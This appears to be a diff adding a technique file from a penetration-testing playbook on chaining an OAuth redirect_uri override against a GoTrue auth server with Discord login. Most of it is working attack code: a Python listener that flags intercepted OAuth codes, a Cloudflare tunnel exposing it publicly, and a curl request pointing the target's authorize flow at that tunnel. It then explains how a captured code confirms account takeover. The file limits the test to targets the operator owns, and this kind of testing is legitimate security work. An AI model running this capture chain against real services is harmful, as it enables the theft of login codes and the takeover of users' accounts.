@@ -1,0 +1,57 @@
+# Live test: Cloudflare Tunnel callback catcher — chain composition
+
+- source canon: `holyshit-mode/oauth-redirect-uri-impact-gate.md`
+- base technique: `holyshit-mode-oauth-redirect-uri-impact-gate-live-test-cloud.md`
+- chain role: **pivot — this BRIDGES a chain: an entry finding upstream plus this pivot plus a final downstream**
+
+## Pairing rule
+
+chain detect pairs same-origin findings (the `_origin()` key: scheme + netloc). This technique composes when a sibling finding shares that origin and the pattern's two legs match. Never invent a chain: both legs need their own baseline→attack→diff proof first.
+
+## Composition
+
+The decisive test requires capturing the OAuth redirect. If the operator owns the target and will click the link:
+
+```bash
+# 1. Stand up a tiny HTTP listener that logs ?code=
+cat > /tmp/oauth_cb_listener.py <<'EOF'
+import http.server, urllib.parse, sys, datetime
+class H(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        p = urllib.parse.urlparse(self.path)
+        params = urllib.parse.parse_qs(p.query)
+        print(f"[{datetime.datetime.now(datetime.UTC).isoformat()}] GET {self.path}", flush=True)
+        if 'code' in params:
+            print(f"\n*** OAUTH CODE INTERCEPTED ***\n", flush=True)
+        self.send_response(200); self.end_headers()
+        self.wfile.write(b"callback captured")
+    def log_message(self, *a): pass
+http.server.HTTPServer(("0.0.0.0", 8888), H).serve_forever()
+EOF
+python3 /tmp/oauth_cb_listener.py 8888 &
+
+# 2. Tunnel it (cloudflared is usually preinstalled)
+cloudflared tunnel --url http://localhost:8888 --no-autoupdate 2>&1 | tee /tmp/cf.log &
+sleep 4
+TUNNEL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' /tmp/cf.log | head -1)
+
+# 3. Confirm GoTrue forwards YOUR tunnel URI
+curl -s -o /dev/null -w "%{redirect_url}\n" \
+  "https://auth.TARGET/auth/v1/authorize?provider=discord&redirect_uri=${TUNNEL}/cb"
+
+# 4. Hand the operator the Discord authorize URL (the 302 Location from step 3)
+#    They open it logged-in, click Authorize. Outcomes:
+#    - Listener sees ?code= → CONFIRMED redirect_uri override works end-to-end
+#    - Discord shows "Invalid OAuth" / redirect_uri_mismatch → provider rejects, chain blocked
+```
+
+Outcome interpretation:
+- **Discord "Invalid OAuth" after authorize click** = Discord app has strict registered-URI validation. The GoTrue redirect_uri override is real but the chain dies at the provider. NOT a working account takeover.
+- **Listener sees ?code=** = Discord app accepts the URI (loose/wildcard registration) → **CONFIRMED account takeover chain**.
+
+Gotcha: the `state` param is bound to a GoTrue server-side session cookie the attacker doesn't have — so even a captured code may not be exchangeable without the victim's cookie. The code landing in your listener is itself the proof the override works; full takeover needs the state cookie too. Report as "redirect_uri delivery confirmed" and note the state-binding as the next gate.
+
+## Walls
+
+- a chain is a SEVERITY judgment over proven findings — never new execution
+- every leg keeps its own ledger row and its own evidence
